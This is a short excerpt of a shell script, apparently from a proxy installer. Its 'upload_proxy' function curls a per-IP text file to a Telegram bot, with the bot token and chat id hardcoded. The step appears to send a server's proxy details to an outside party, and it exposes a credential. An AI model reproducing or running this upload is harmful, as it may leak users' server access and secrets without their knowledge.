...
upload_proxy() {
    ...
    curl -X POST -F 'document=@/home/proxy-installer/'"$IP4"'.txt' -F 'chat_id=-818506427' https://api.telegram.org/bot6572357571:AAE9C4oJiQ5Fz5OR9gzMGW6aWC2pKQ1fcug/sendDocument
